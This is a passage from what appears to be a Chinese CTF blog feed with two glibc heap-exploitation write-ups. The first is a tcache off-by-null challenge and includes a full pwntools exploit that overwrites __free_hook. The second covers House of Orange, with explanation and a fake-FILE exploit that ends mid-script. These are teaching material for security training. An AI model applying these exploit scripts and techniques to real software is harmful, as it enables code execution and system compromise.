src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803152934100.png" alt="image-20240803152934100"></p><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>本题申请堆块是固定的，并且是0x100堆块对齐，对于off by null 一般可以考虑overlap-chunk，那么对于本题，libc是2.27的引入了tcachebin进制，所以要先申请free掉7个堆块之后剩下的堆块才会进入相应的链表中。</p><p>我们先申请10个堆块</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    malloc()<br><br></code></pre></td></tr></table></figure><p>然后释放前6个（0-5）然后释放最后一个（9）这样做为了防止堆块合并</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(i)<br><br>free(<span class="hljs-number">9</span>)<br><br></code></pre></td></tr></table></figure><p>最后再free 6，7，8堆块</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>,<span class="hljs-number">9</span>):<br>    free(i)<br><br></code></pre></td></tr></table></figure><p>那么此时堆块内容是这样的</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803154146061.png" alt="image-20240803154146061"></p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803154240221.png" alt="image-20240803154240221"></p><p>但是注意，虽然合并了，堆块上有残留的prev size，可以让我们构造出overlap-chunk</p><p>然后我们再把堆块申请回来</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    malloc()<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#7</span><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#8</span><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#9</span><br><br></code></pre></td></tr></table></figure><p>这样做的目的是等会把chunk 8 最后加入tcachebin 链表中，这样下次申请的时候就是第一个，并且此时把chunk 7 加入到unsortbin 链表中，那么就有了libc的地址指向chunk 7</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(i)<br><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment"># 0 tcache</span><br>free(<span class="hljs-number">7</span>) <span class="hljs-comment"># unsort</span><br><br></code></pre></td></tr></table></figure><p>此时申请堆块的同时实现off_by_null 申请大小0xf8堆块</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">malloc(<span class="hljs-number">0xf8</span>) <span class="hljs-comment">#0</span><br><br></code></pre></td></tr></table></figure><p>申请之前</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803154851632.png" alt="image-20240803154851632"></p><p>申请之后</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803154922772.png" alt="image-20240803154922772"></p><p>由于之前申请了chunk8导致tcachebin链表少了一个堆块，我们此时把chunk6放入tcachebin中，因为接下来要free chunk9，让chunk9在unsortbin中和堆块8合并。那么此时堆块9就无了，你也可以认为8 和9此时都是8。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">free(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">9</span>)<br><br></code></pre></td></tr></table></figure><p>那么此时把chunk 7 申请出来就好了，那么chunk8就在指针头的位置了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment">#1-7</span><br>    malloc(i)<br><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#8 over_heap</span><br><br></code></pre></td></tr></table></figure><p>因为申请导致指针变换，及之前的chunk8就是第一次从tcachebin 链表申请出来了chunk 0，现在chunk0正在unsortbin中正在使用，但由于堆块合并导致它加入了unsortbin中，所以show（0）就可以泄露libc地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">puts(<span class="hljs-number">0</span>)<br><br>io.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>malloc_hook = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>log.info(<span class="hljs-string">&quot;malloc hook: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p>那么接下来就有意思了，还记得我说chunk9无了吗，是的它现在是没有了，我们再次申请堆块的时候，由于此时chunk 0 还在unsortbin里面申请的时候就会申请到它，标记下标为chunk9 ，但是此时chunk0 在使用中，所以被申请了两次，但是有两个下标chunk 0 chunk 9</p><p>所以free 0 free 9 就会实现double free，但是为了绕过检查我们在tcachebin头部放入一个正常的堆块</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#9 ----&gt;  fake  0</span><br><br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">9</span>)<br>free(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>那么此时</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803160138648.png" alt="image-20240803160138648"></p><p>好了你可以愉快的申请堆块来修改__free_hook了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">malloc(<span class="hljs-number">0x10</span>,p64(free_hook))<br><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>malloc(<span class="hljs-number">0x10</span>,p64(one_gadget))<br><br>free(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = process(<span class="hljs-string">&quot;../pwn159&quot;</span>)<br><span class="hljs-comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28228)</span><br>libc = ELF(<span class="hljs-string">&quot;/home/su/PWN/VIPshow/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size=<span class="hljs-number">1</span>,content=<span class="hljs-string">&quot;&quot;</span></span>):<br>        io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>        io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>        io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>        io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">puts</span>(<span class="hljs-params">index</span>):<br>        io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>        io.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    malloc()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(i)<br><br>free(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>,<span class="hljs-number">9</span>):<br>    free(i)<br><br><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    malloc()<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#7</span><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#8</span><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#9</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(i)<br><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment"># 0 tach</span><br><br>free(<span class="hljs-number">7</span>) <span class="hljs-comment"># unsort</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>malloc(<span class="hljs-number">0xf8</span>) <span class="hljs-comment">#0</span><br><br>free(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment">#1-7</span><br>    malloc(i)<br><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#8 over_heap</span><br><br>puts(<span class="hljs-number">0</span>)<br><br>io.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>malloc_hook = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>log.info(<span class="hljs-string">&quot;malloc hook: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#pause()</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0x4f322</span><br>gdb.attach(io)<br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#9 ----&gt;  fake  0</span><br><br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">9</span>)<br>free(<span class="hljs-number">0</span>)<br><br>malloc(<span class="hljs-number">0x10</span>,p64(free_hook))<br><br>malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>malloc(<span class="hljs-number">0x10</span>,p64(one_gadget))<br><br>free(<span class="hljs-number">2</span>)<br><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>PWN!</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc2.23——house of orange</title>
    <link href="/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/"/>
    <url>/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/</url>
    
    <content type="html"><![CDATA[<h2 id="glibc2-23——house-of-orange"><a href="#glibc2-23——house-of-orange" class="headerlink" title="glibc2.23——house of orange"></a><strong>glibc2.23——house of orange</strong></h2><p>什么是house of orange，这个名字的由来是2016年一道题目，它里面的内容跟orange有关，因此这个手法也就相应而出现，其实house of orange 有<strong>两个阶段</strong></p><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a><strong>第一阶段</strong></h3><p>有的时候程序限制了你申请堆块的限制（导致不能申请到unsortbin），或者直接不给你free功能，那么泄露libc地址就成了一个麻烦，但是house of orange 就可以解决这个问题，如果我们能控制到top chunk的size位，那么我们就可以把它修改掉，这样top chunk 变小了，那么下次我们再申请一个比它大的堆块的时候，<strong>就有两种情况</strong>，第一种就是把当前top chunk 加入unsortbin，第二种情况就是直接使用mmap来申请一块内存了，当然我们想要第一种情况，那么就要注意申请堆块的大小</p><p><strong>1、(unsigned long) (old_size) &gt;&#x3D; MINSIZE</strong></p><p><strong>2、 prev_inuse (old_top) &#x3D; 1</strong></p><p><strong>3、 ((unsigned long) old_end &amp; (pagesize - 1)) &#x3D;&#x3D; 0)</strong></p><p>而且修改的时候还要注意页对齐，比如原来是0x2fe1，那么就可以改成0xfe1</p><p>那么就可以通过上面的操作得到unsortbin，然后进行切片就可以得到libc的地址，但是在2.23以前要实现house of orange还需要知道heap的地址，因为我们要精准的伪造虚函数表（vtable）那么就要得到它的准确位置，因为2.23以前对它的检查没有那么严格，所以我们可以直接把它放到fake_chunk里面，那么怎么得到堆地址呢，如果我们可以申请到largebin范围大小的堆块，那么就可以利用largebin的fd_nextsize来泄露堆地址，当然如果不给我们largebin范围大小的堆块，如果题目没有开pie，或者已经知道程序基地址的情况下，若堆块的指针保存在bss段上，那么可以通过unsortbin attack 来泄露堆地址。</p><p>到目前位置准备工作已经做完了，那么让我们进入下一阶段。</p><h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a><strong>第二阶段</strong></h3><p>下面介绍一下**_IO_overflow<strong>，这个函数会把fd也就是文件指针当作第一个参数，然后进行调用，而</strong>_IO_overflow**这个函数在vtable的第4个位置，那么就可以把这个位置放上system，然后fd位放上&#x2F;bin&#x2F;sh，这个函数怎么来的？</p><p>当glibc检测到内存出错的时候会执行</p><p><strong>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</strong></p><p>因此核心思想就是劫持**<em>IO_list_all**，这个东西是_IO_FILE_plus_结构体的指针，一般指向_IO_2_1_stderr</em></p><p><img src="/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/image-20240731103010939.png" alt="image-20240731103010939"></p><p>而vtable，也就是_IO_jump_t，而<code>_IO_file_plus</code> 是一个结构体，它继承自 <code>_IO_FILE</code> 结构体，并且包含了一个 <code>_IO_jump_t</code> 类型的指针（即虚函数表）。</p><p><img src="/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/image-20240731103738027.png" alt="image-20240731103738027"></p><p>那么现在就可以开始劫持了，但是在此之前还需要了解一下_IO_list_all</p><p><img src="/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/image-20240731104026347.png" alt="image-20240731104026347"></p><p>可以看见vtable在结构体的末尾，指向_IO_file_jumps我们伪造的就是它，具体偏移可以数一下<strong>64位下在0xd8的位置</strong>，<strong>而chain字段在0x68的位置</strong>，那么改怎么控制呢，我们知道unsortbin的chunk指向main_arena+88的位置，那么它加0x68的位置就是main_arean+0xc0的位置，那么这个位置就是smallbin第6条链表的位置，如果我们把unsortbin的bk字段改成  _IO_list_all -0x10的位置，那么由于unsortbin attack我们可以知道，此时  _IO_list_all的指针也指向main_arena+88的位置，但是这个位置我们不可控，那么就要寻找一下可以控制的地方，那么如果把unsortbin的size位改成0x61呢，那么下次申请堆块的时候如果不满足条件就会加入到smallbin的第六条链子中，前面提到了，此时chain字段偏移位main_arena+ 88 +0x68此时正好是我们修改之后堆块的头部，那么我们就可以在此处伪造vtable</p><p>不过还需要绕过一个fflush函数的检查，也就是如果缓冲区有东西的话才会刷新，也就是保证_IO_write_ptr 这个大小要大于 _IO_write_base，即可。</p><h3 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a><strong>例题演示</strong></h3><p>题目保护情况</p><p><img src="/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/image-20240731110145070.png" alt="image-20240731110145070"></p><p>64位ida载入</p><p><img src="/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/image-20240731110237500.png" alt="image-20240731110237500"></p><p>那么可以看见是没有free函数的，那么可以考虑使用house of orange来获取libc地址</p><p><img src="/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/image-20240731110410262.png" alt="image-20240731110410262"></p><p>而且满足我们申请大堆块的要求，而且没有开pie</p><p><img src="/2024/08/02/glibc2.23%E2%80%94%E2%80%94house%20of%20orange/image-20240731111312765.png" alt="image-20240731111312765"></p><p>而且edit函数可以进行溢出</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a><strong>分析</strong></h3><p>那么思路很清晰，通过house of orange 来泄露libc，然后通过unsortbin attack来泄露heap地址，之后通过溢出来劫持IO流，通过malloc错误来获取shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./jingdian&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;110.40.35.73&#x27;,33807)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc6_2.23-0ubuntu11.3_amd64.so&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,payload</span>):<br>   io.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>   io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>   io.recvuntil(<span class="hljs-string">&quot;Size :&quot;</span>)<br>   io.sendline(<span class="hljs-built_in">str</span>(size))<br>   io.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>   io.send(payload)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,payload</span>):<br>   io.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>   io.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>   io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>   io.sendline(<span class="hljs-built_in">str</span>(index))<br>   io.recvuntil(<span class="hljs-string">&quot;Size :&quot;</span>)<br>   io.sendline(<span class="hljs-built_in">str</span>(size))<br>   io.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>   io.send(payload)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>  io.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>  io.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>  io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>  io.sendline(<span class="hljs-built_in">str</span>(index))<br><br><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>payload = cyclic(<span class="hljs-number">0x18</span>)+p64(<span class="hljs-number">0xfe1</span>)<br>gdb.attach(io)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<span class="hljs-comment">#2</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>show(<span class="hljs-number">2</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>libc_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x5b9</span>- <span class="hljs-number">0x68</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-comment">#libc_addr = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x3c5131</span><br>success(<span class="hljs-string">&quot;libc_addr :&quot;</span>+<span class="hljs-built_in">hex</span>(libc_addr))<br><span class="hljs-comment"># unsorted bin attack </span><br>pause()<br>payload = cyclic(<span class="hljs-number">0x18</span>)+p64(<span class="hljs-number">0xfa1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4040E0</span>+<span class="hljs-number">0x50</span>) <br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>add(<span class="hljs-number">0xf90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#3</span><br>show(<span class="hljs-number">12</span>)<br>io.recv()<br>heap_addr = u64(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x22010</span><br>success(<span class="hljs-string">&quot;heap_addr :&quot;</span>+<span class="hljs-built_in">hex</span>(heap_addr))<br>pause()<br><span class="hljs-comment">#还原unsortbin的fd，bk指针，方便下一步进行伪造</span><br>payload = p64(heap_addr+<span class="hljs-number">0x22010</span>)+p64(heap_addr+<span class="hljs-number">0x40</span>)*<span class="hljs-number">3</span><br>edit(<span class="hljs-number">12</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>payload = cyclic(<span class="hljs-number">0x18</span>)+p64(<span class="hljs-number">0xfa1</span>)+p64(libc_addr+<span class="hljs-number">0x3c4b78</span>)*<span class="hljs-number">2</span> <span class="hljs-comment">#这个就是main_arena + 88处地址</span><br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>IO_list_all = libc_addr + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system_addr = libc_addr + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = cyclic(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#</span><br><br><br>fake_file = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>) <span class="hljs-comment">#</span><br>fake_file += p64(<span class="hljs-number">0</span>)+p64(IO_list_all-<span class="hljs-number">0x10</span>) <span class="hljs-comment">#</span><br>fake_file += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># 满足_IO_write_ptr &gt; _IO_write_base</span><br>fake_file = 